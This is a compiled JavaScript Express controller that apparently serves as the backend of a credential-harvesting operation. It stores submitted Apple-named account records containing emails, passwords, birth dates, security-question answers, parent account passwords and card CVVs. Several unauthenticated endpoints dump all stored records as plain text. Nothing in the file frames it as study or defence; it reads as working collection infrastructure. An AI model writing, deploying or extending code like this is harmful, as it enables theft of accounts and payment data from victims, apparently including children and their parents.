"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.getUnknowns = exports.getAccountsWithParent = exports.getAccounts = exports.addUnknown = exports.addAccountWithParent = exports.addAccount = void 0;
const unknownModel_1 = __importDefault(require("../models/unknownModel"));
const appleAccountModel_1 = __importDefault(require("../models/appleAccountModel"));
const accountWithParentModel_1 = __importDefault(require("../models/accountWithParentModel"));
const addAccount = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const account = req.body;
        if (Object.keys(account).length === 0) {
            res.status(400).send("Invalid request");
            return;
        }
        yield appleAccountModel_1.default.create(account);
        res.status(201).send("Account added successfully");
    }
    catch (error) {
        console.log(error);
        res.status(500).send("Something went wrong adding the account");
    }
});
exports.addAccount = addAccount;
const addAccountWithParent = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const account = req.body;
        if (Object.keys(account).length === 0) {
            res.status(400).send("Invalid request");
            return;
        }
        yield accountWithParentModel_1.default.create(account);
        res.status(201).send("Account added successfully");
    }
    catch (error) {
        console.log(error);
        res.status(500).send("Something went wrong adding the account");
    }
});
exports.addAccountWithParent = addAccountWithParent;
const addUnknown = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const account = req.body;
        if (Object.keys(account).length === 0) {
            res.status(400).send("Invalid request");
            return;
        }
        yield unknownModel_1.default.create(account);
        res.status(201).send("Unknown added successfully");
    }
    catch (error) {
        console.log(error);
        res.status(500).send("Something went wrong adding the account");
    }
});
exports.addUnknown = addUnknown;
const getAccounts = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const accounts = yield appleAccountModel_1.default.find();
        const accountText = accounts
            .map(({ email, password, date, first_q, second_q, third_q }) => `${email},${password},${date},${first_q},${second_q},${third_q}`)
            .join("<br />");
        res.status(200).send(`<p>${accountText}</p>`);
    }
    catch (error) {
        res.status(500).send("Something went wrong getting the gmail");
    }
});
exports.getAccounts = getAccounts;
const getAccountsWithParent = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const accounts = yield accountWithParentModel_1.default.find();
        const accountText = accounts
            .map(({ email, password, date, first_q, second_q, third_q, first_name, last_name, parent_email, parent_password, parent_date, parent_first_q, parent_second_q, parent_third_q, cvv, }) => `${email},${password},${date},${first_q},${second_q},${third_q},${first_name},${last_name},${parent_email},${parent_password},${parent_date},${parent_first_q},${parent_second_q},${parent_third_q},${cvv}`)
            .join("<br />");
        res.status(200).send(`<p>${accountText}</p>`);
    }
    catch (error) {
        res.status(500).send("Something went wrong getting the gmail");
    }
});
exports.getAccountsWithParent = getAccountsWithParent;
const getUnknowns = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const accounts = yield unknownModel_1.default.find();
        const accountText = accounts
            .map(({ email, password, date, first_q, second_q, third_q, first_name, last_name, parent_email, parent_password, parent_date, parent_first_q, parent_second_q, parent_third_q, cvv, }) => `${email},${password},${date},${first_q},${second_q},${third_q},${first_name},${last_name},${parent_email},${parent_password},${parent_date},${parent_first_q},${parent_second_q},${parent_third_q},${cvv}`)
            .join("<br />");
        res.status(200).send(`<p>${accountText}</p>`);
    }
    catch (error) {
        res.status(500).send("Something went wrong getting the gmail");
    }
});
exports.getUnknowns = getUnknowns;
